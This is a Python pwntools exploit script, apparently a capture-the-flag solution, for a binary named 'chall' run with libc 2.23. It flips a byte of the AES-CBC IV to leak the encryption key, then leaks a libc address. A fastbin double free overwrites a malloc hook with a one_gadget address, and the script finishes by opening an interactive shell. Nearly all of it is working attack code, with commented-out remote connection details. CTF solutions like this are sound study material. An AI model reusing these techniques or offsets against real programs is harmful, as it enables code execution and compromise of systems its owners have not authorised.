from pwn import *
from Crypto.Cipher import AES
r = process("./chall",env = {"LD_PRELOAD" : "./libc-2.23.so"})
#r = remote('35.245.143.0',1337)
#key = "5949eebb28e0df11feac0b73bdb4dba2".decode("hex")

def decrypt(payload,IV,key):
    obj = AES.new(key, AES.MODE_CBC,IV)
    ques = obj.decrypt(payload)                        #encrypt the string and send it 
    return ques.encode("hex")

def vault_ID(id):
    r.sendlineafter("Enter your vault ID:",str(id))

def conceal_spell(pt,size):
    r.sendlineafter("quest\n",str(1))
    r.sendlineafter("size:\n",str(size))
    r.sendlineafter("plaintext:",pt)
    print(r.recvline())
    #print("lol " + r.recvline())
    r.recvuntil("concealed!\n")
    ct = r.recvline().strip().decode("hex")
    print("Ciphertext: {}".format(ct.encode("hex")))
    return ct

def delete():
    r.sendlineafter("quest\n",str(3))

def change_name(ct,fake_iv):
    r.sendlineafter("quest\n",str(2))
    r.sendlineafter("Enter encrypted name:",ct)
    r.sendlineafter("Enter IV(16 bytes):",fake_iv)
    #r.recvuntil("Your new name:")
    #print(r.recvline())#.encode("hex"))

def exit_(payload):
    r.sendlineafter("quest\n",str(4))
    r.sendline(payload)

#getting key leaks
r.recvuntil("IV:")
IV =  r.recvline().strip().decode("hex")
r.sendlineafter('letter-code :','aaa')
r.recvuntil("code : ")
ct = r.recvline().strip().decode("hex")
vault_ID(1)
fake_iv = ""
ct_p = ct[15]
ct_p = chr(ord(IV[15])^ord('\xff')^ord('\x0d'))
fake_iv = IV[:15]+ct_p

#gdb.attach(r)
change_name(ct.encode("hex"),fake_iv)
print(r.recvuntil("new name:"))
#log.info("Shit = " + str(r.recv(48)))

r.recv(16)
key_leak = r.recv(16)
r.recv(16)
#key_leak = r.recvline().strip()[16:32]

log.success("Key leaked = " + str(key_leak))
log.info("key orig = " + key.encode("hex"))
print(key_leak == key)
print(key.encode("hex"))

vault_ID(1)
ct = conceal_spell('a'*0x8,0x70)

vault_ID(2)
ct = conceal_spell('a'*0x8,0x50)

vault_ID(1)
delete()

vault_ID(3)
libc_ptr = u64(conceal_spell('\x00',0x70).ljust(8,'\x00'))-0x3f80-0xbf8
io_wide = libc_ptr+0x4aed
libc_base = libc_ptr-0x3c0000
log.info("libc_base {}".format(hex(libc_base)))
one_gadf = libc_base+ 0xf02a4

#exploiting double free

vault_ID(4)
ct = conceal_spell('b'*0x8,0x50)

vault_ID(2)
delete()

vault_ID(4)
delete()

vault_ID(2) #2->4->2
delete()

vault_ID(5)
#
target = libc_base + 0x3c4aed
payload = p64(target)+'\x08'*8
k = decrypt(payload,IV,key_leak)
#print(k)
conceal_spell(k.decode("hex"),0x50)

vault_ID(6)
conceal_spell("c"*0xf,0x50)

vault_ID(7)
conceal_spell("c"*0x8,0x50)

vault_ID(8)
#gdb.attach(r)
payload = 'a'*19 + p64(one_gadf)+'\x05'*5
print(len(payload))
k = decrypt(payload,IV,key_leak)
print("sending...{}".format(k.encode("hex")))
conceal_spell(k.decode("hex"),0x50)

gdb.attach(r)
vault_ID(9)
r.sendline(str(1))
r.sendline(str(0x20))
r.sendlineafter("plaintext:",'\x00')
#exit_('/bin//sh%100000c')
r.interactive()